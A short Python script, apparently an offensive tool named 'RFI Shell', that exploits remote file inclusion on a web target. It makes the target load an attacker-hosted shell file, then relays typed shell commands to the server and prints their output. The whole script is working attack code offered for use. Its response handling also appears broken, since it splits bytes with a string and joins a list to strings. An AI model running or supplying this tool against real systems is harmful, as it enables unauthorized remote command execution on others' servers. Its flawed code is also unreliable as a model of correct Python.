#!/usr/bin/python
'''Created by hosein-khanalizadeh on april 2024'''

import os, sys, platform

try:
	import requests
	from colorama import init
except:
	os.system('pip install -r requirements.txt')
	import requests
	from colorama import init

if platform.system() == 'Windows':
	os.system('cls')
else:
	os.system('clear')

init()
green = '\033[32m'
white = '\033[37m'
red = '\033[31m'
blue = '\033[34m'
yellow = '\033[33m'
link = '\033[94m'
reset = "\033[0;0m"

h = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0'}

def banner():
	print('\n',
		green+'RRRRRRRRRRRRRRRRR   FFFFFFFFFFFFFFFFFFFFFFIIIIIIIIII\n',
		green+'R::::::::::::::::R  F::::::::::::::::::::FI::::::::I\n',
		green+'R::::::RRRRRR:::::R F::::::::::::::::::::FI::::::::I\n',
		green+'RR:::::R     R:::::RFF::::::FFFFFFFFF::::FII::::::II\n',
		green+'  R::::R     R:::::R  F:::::F       FFFFFF  I::::I  \n',
		white+'  R::::R     R:::::R  F:::::F               I::::I  \n',
		white+'  R::::RRRRRR:::::R   F::::::FFFFFFFFFF     I::::I  \n',
		white+'  R:::::::::::::RR    F:::::::::::::::F     I::::I  \n',
		white+'  R::::RRRRRR:::::R   F:::::::::::::::F     I::::I  \n',
		white+'  R::::R     R:::::R  F::::::FFFFFFFFFF     I::::I  \n',
		white+'  R::::R     R:::::R  F:::::F               I::::I  \n',
		red+'  R::::R     R:::::R  F:::::F               I::::I  \n',
		red+'RR:::::R     R:::::RFF:::::::FF           II::::::II\n',
		red+'R::::::R     R:::::RF::::::::FF           I::::::::I\n',
		red+'R::::::R     R:::::RF::::::::FF           I::::::::I\n',
		red+'RRRRRRRR     RRRRRRRFFFFFFFFFFF           IIIIIIIIII\n',
		white+'=============================================================\n',
		link+'github             : https://github.com/hosein-khanalizadeh\n',
		link+'medium             : https://medium.com/@hosein-khanalizadeh\n',
		white+'=============================================================',
		reset
		)

def usage():
	print(blue+' RFI Shell v1.0')
	if platform.system() == 'Windows':
		print(blue+' python rfi.py "http://target/?p=" "http://url/shell.txt&c="')
	else:
		print(blue+' python3 rfi.py "http://target/?p=" "http://url/shell.txt&c="')
	print(reset)

def main(url, shell):
	while 1:
		try:
			cmd = input('$')
			if cmd == 'quit' or cmd == 'exit':
				break
			url2 = url + shell + cmd
			r = requests.get(url2, headers=h)
			if r.status_code == 200:
				res = r.content.split('<Html>')
				print(yellow+res+reset)
			else:
				print(red+' [!] Error!'+reset)
				break
		except:
			print(red+' [!] Error!'+reset)

if __name__ == '__main__':
	try:
		banner()
		if len(sys.argv) == 3:
			main(sys.argv[1], sys.argv[2])
		else:
			usage()
	except KeyboardInterrupt as e:
		sys.exit()